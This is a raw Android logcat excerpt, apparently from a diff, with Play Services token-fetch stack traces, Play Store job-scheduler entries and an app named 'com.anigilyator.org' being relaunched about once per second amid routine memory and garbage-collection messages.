+12-05 18:54:01.463  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:54:01.463  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:01.463  2016  2605 E NetRec  : [131] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:54:01.463  2016  2605 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2605 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:01.463  2016  2605 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:01.463  2016  2605 W NetRec  : [131] amxc.a: No server tokens extracted.
+12-05 18:54:01.513  3743  3743 I Finsky  : [2] achm.handleMessage(4): SCH: DeviceState: DeviceState{currentTime=1607190841512, isCharging=true, isIdle=false, netAny=true, netNotRoaming=true, netUnmetered=true, batteryPercent=100.0}
+12-05 18:54:01.515  3743  6474 I Finsky  : [325] acjx.b(5): SCH: Jobs in database: 1-1337 3-1018 12-1 24-77777777 26-1414141414 
+12-05 18:54:01.516  3743  3743 I Finsky  : [2] achn.m(9): SCH: Running job: 12-1
+12-05 18:54:01.517  3743  3743 I Finsky  : [2] ContentSyncJob.r(1): [ContentSync] job started
+12-05 18:54:01.517  3743  3743 I Finsky  : [2] achm.handleMessage(29): SCH: RunningQueue size: 1, PendingQueue size: 0
+12-05 18:54:01.517  3743  3743 I Finsky  : [2] achm.handleMessage(32): SCH: Running queue: 12-1 
+12-05 18:54:01.533  3743  6476 I Finsky  : [327] gmz.b(1): Completed 0 account content syncs with 0 successful.
+12-05 18:54:01.533  3743  3743 I Finsky  : [2] ContentSyncJob.a(1): [ContentSync] Installation state replication succeeded.
+12-05 18:54:01.533  3743  3743 I Finsky  : [2] aciw.n(4): SCH: jobFinished: 12-1. TimeElapsed: 16ms.
+12-05 18:54:01.534  3743  3743 I Finsky  : [2] achn.b(3): SCH: Job 12-1 finished. Not rescheduling.
+12-05 18:54:01.534  3743  3743 I Finsky  : [2] achm.handleMessage(29): SCH: RunningQueue size: 0, PendingQueue size: 0
+12-05 18:54:01.534  3743  3743 I Finsky  : [2] achm.handleMessage(10): SCH: Executor finished
+12-05 18:54:01.540  3743  3743 I Finsky  : [2] acjx.b(5): SCH: Jobs in database: 1-1337 3-1018 24-77777777 26-1414141414 
+12-05 18:54:01.542  3743  3743 I Finsky  : [2] acij.d(37): SCH: ConstraintMapping: 24-77777777,  -> L: 0ms, D: 56606086ms, C: false, I: true, N: 0
+12-05 18:54:01.542  3743  3743 I Finsky  : [2] acij.d(37): SCH: ConstraintMapping: 1-1337,  -> L: 36715395ms, D: 79915395ms, C: false, I: false, N: 1
+12-05 18:54:01.542  3743  3743 I Finsky  : [2] acij.d(37): SCH: ConstraintMapping: 3-1018,  -> L: 0ms, D: 85971643ms, C: true, I: true, N: 2
+12-05 18:54:01.542  3743  3743 I Finsky  : [2] acij.d(37): SCH: ConstraintMapping: 26-1414141414,  -> L: 16826094ms, D: 17726094ms, C: false, I: false, N: 0
+12-05 18:54:01.543  3743  3743 I Finsky  : [2] acij.f(7): SCH: Cancelling existing jobscheduler jobs: 9007 9000 9006 
+12-05 18:54:01.543  3743  3743 I Finsky  : [2] acij.e(8): SCH: Throttling wakeup for job 9001 (expected to run in 0 ms) due to recent wakeup
+12-05 18:54:01.543  3743  3743 I Finsky  : [2] acij.e(23): SCH: Scheduling job Id: 9001, L: 30000, D: 56606086, C: false, I: true, N: 0
+12-05 18:54:01.544  3743  3743 I Finsky  : [2] acij.e(23): SCH: Scheduling job Id: 9002, L: 36715395, D: 79915395, C: false, I: false, N: 1
+12-05 18:54:01.544  3743  3743 I Finsky  : [2] acij.e(8): SCH: Throttling wakeup for job 9003 (expected to run in 0 ms) due to recent wakeup
+12-05 18:54:01.544  3743  3743 I Finsky  : [2] acij.e(23): SCH: Scheduling job Id: 9003, L: 30000, D: 85971643, C: true, I: true, N: 2
+12-05 18:54:01.545  3743  3743 I Finsky  : [2] acij.e(23): SCH: Scheduling job Id: 9004, L: 16826094, D: 17726094, C: false, I: false, N: 0
+12-05 18:54:01.570  2016  2605 E Volley  : [131] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:54:01.571  2016  4057 I NetRec  : [202] anai.c: Will retry failed rapid_refresh_scores_task task as standard refresh.
+12-05 18:54:01.572  2016  4057 W NetRec  : [202] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 2.
+12-05 18:54:01.576  2016  4057 I NetRec  : [202] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new rapid_refresh_scores_task refresh.
+12-05 18:54:01.577  2016  4057 I NetRec  : [202] NetRecChimeraGcmTaskService.a: Completed rapid_refresh_scores_task score refresh task in 130 ms, returning 2
+12-05 18:54:01.579  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:4 result: 2 elapsed_millis: 138 uptime_millis: 138 exec_start_elapsed_seconds: 505 [CONTEXT service_id=218 ]
+12-05 18:54:01.602  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.icing.service.IcingGcmTaskService started execution. cause:5 exec_start_elapsed_seconds: 505 [CONTEXT service_id=218 ]
+12-05 18:54:01.615  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.icing.service.IcingGcmTaskService finished executing. cause:5 result: 1 elapsed_millis: 9 uptime_millis: 9 exec_start_elapsed_seconds: 505 [CONTEXT service_id=218 ]
+12-05 18:54:02.085  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:54:02.085  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:02.103  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:02.103  6639  6676 I zygote  : Explicit concurrent copying GC freed 39531(1273KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1100KB/2MB, paused 10us total 2.955ms
+12-05 18:54:02.422  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:02.421  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:03.428  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:05.450  1641  1767 I chatty  : uid=1000(system) Binder:1641_3 identical 2 lines
+12-05 18:54:06.426  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:07.433  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:07.438  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 5 lines
+12-05 18:54:08.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:09.251  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Thread.sleep(java.lang.Object, long, int) at PC 0x71438ad5
+12-05 18:54:09.251  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable long java.lang.System.nanoTime() at PC 0x71438ade
+12-05 18:54:09.252  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Thread.sleep(long, int) at PC 0x7143857e
+12-05 18:54:09.252  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Thread.sleep(long) at PC 0x71d879f0
+12-05 18:54:09.252  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable long java.lang.System.nanoTime() at PC 0x71d8798b
+12-05 18:54:09.252  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable boolean java.lang.Daemons$FinalizerWatchdogDaemon.sleepFor(long) at PC 0x71d87c99
+12-05 18:54:09.252  6639  6648 W zygote  : Got a deoptimization request on un-deoptimizable java.lang.Object java.lang.Daemons$FinalizerWatchdogDaemon.waitForFinalization() at PC 0x71d87f40
+12-05 18:54:09.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:10.087  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:10.087  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:08.436  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 1 line
+12-05 18:54:09.435  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:10.433  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:10.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:11.433  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:12.425  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:11.436  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 1 line
+12-05 18:54:12.426  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:13.315  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:13.315  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:13.329  6639  6676 I zygote  : Waiting for a blocking GC Explicit
+12-05 18:54:13.330  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:13.334  6639  6676 I zygote  : Explicit concurrent copying GC freed 103(57KB) AllocSpace objects, 0(0B) LOS objects, 57% free, 1133KB/2MB, paused 36us total 3.657ms
+12-05 18:54:13.419  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:13.420  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:14.245  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:14.245  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:14.261  6639  6676 I zygote  : Explicit concurrent copying GC freed 39547(1295KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1101KB/2MB, paused 9us total 2.235ms
+12-05 18:54:14.261  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:15.500  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:15.518  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:15.549  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:16.120  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:16.120  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:16.141  6639  6676 I zygote  : Explicit concurrent copying GC freed 14442(515KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 12us total 3.092ms
+12-05 18:54:16.141  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:16.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:16.455  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:16.455  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:16.468  2186  2186 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:54:17.064  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:17.064  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:17.081  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.545ms
+12-05 18:54:17.081  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:17.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:18.007  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:18.007  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:18.030  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:18.032  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 11us total 2.927ms
+12-05 18:54:18.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:18.977  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:54:18.978  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:19.004  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 3.076ms
+12-05 18:54:19.004  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:17.422  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 4 lines
+12-05 18:54:18.434  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:19.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:19.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:19.951  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:19.951  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:19.970  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.610ms
+12-05 18:54:19.970  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:20.435  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:20.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:20.935  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:20.935  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:20.957  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.824ms
+12-05 18:54:20.957  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:21.422  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:21.950  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:21.950  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:21.970  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:21.970  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 11us total 3ms
+12-05 18:54:22.446  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:22.913  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:22.913  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:22.933  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:22.934  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 11us total 2.675ms
+12-05 18:54:23.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:23.936  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:23.936  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:23.960  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:23.960  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.635ms
+12-05 18:54:24.287  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.clearcut.service.START pkg=com.google.android.gms }
+12-05 18:54:24.287  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:24.287  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:24.287  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.phenotype.service.START pkg=com.google.android.gms }
+12-05 18:54:22.445  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 2 lines
+12-05 18:54:23.421  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:24.439  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:24.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:24.907  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:24.907  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:24.925  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:24.926  6639  6676 I zygote  : Explicit concurrent copying GC freed 39567(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.895ms
+12-05 18:54:25.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:25.879  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:25.879  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:25.894  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:25.894  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 8us total 2.253ms
+12-05 18:54:25.436  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:26.435  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:26.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:26.822  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:26.822  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:26.840  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.874ms
+12-05 18:54:26.840  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:27.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:27.828  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:27.829  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:27.845  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:27.845  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 12us total 2.685ms
+12-05 18:54:27.434  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:28.423  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:28.424  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:28.751  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:28.751  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:28.765  6639  6676 I zygote  : Explicit concurrent copying GC freed 39550(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 8us total 2.221ms
+12-05 18:54:28.765  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:29.537  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:29.627  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:29.627  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:29.675  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:29.675  6639  6676 I zygote  : Explicit concurrent copying GC freed 7509(336KB) AllocSpace objects, 0(0B) LOS objects, 57% free, 1146KB/2MB, paused 31us total 2.879ms
+12-05 18:54:30.046  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:30.047  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:30.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:30.890  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:30.890  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:30.903  6639  6676 I zygote  : Waiting for a blocking GC Explicit
+12-05 18:54:30.904  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:30.907  6639  6676 I zygote  : Explicit concurrent copying GC freed 216(60KB) AllocSpace objects, 0(0B) LOS objects, 57% free, 1128KB/2MB, paused 31us total 2.923ms
+12-05 18:54:30.421  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:31.450  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:31.452  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:31.846  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:31.846  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:31.866  6639  6676 I zygote  : Explicit concurrent copying GC freed 39621(1281KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 12us total 3.081ms
+12-05 18:54:31.866  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:32.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:32.817  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:32.817  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:32.833  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.480ms
+12-05 18:54:32.833  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:32.436  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:33.423  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:33.425  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:33.750  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:33.750  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:33.766  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.320ms
+12-05 18:54:33.766  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:34.431  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:34.676  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:34.676  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
